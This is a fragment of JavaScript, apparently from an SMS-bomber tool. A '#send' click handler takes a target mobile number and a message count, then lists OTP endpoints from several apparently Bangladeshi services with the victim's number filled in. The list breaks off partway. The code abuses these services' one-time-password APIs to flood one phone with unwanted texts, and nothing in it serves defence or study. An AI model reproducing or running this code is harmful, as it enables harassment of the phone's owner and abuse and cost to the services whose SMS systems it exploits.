    ...
    $(document).on('click', '#send', function (e) {
        ...
        if (amount > 0 && mobile.length == 10) {
            ...
            const APIS = [
                {
                    method: "POST",
                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-0${mobile}/operator-Robi/send`,
                },
                {
                    method: 'POST',
                    url: "http://robi.api.bongobd.com/api/login/send-otp",
                    body: `msisdn=880${mobile}&operator=all`
                },
                {
                    method: 'GET',
                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=880${mobile}`
                },
                {
                    method: 'GET',
                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=0${mobile}&countryPhoneCode=%2B88`
                },
                {
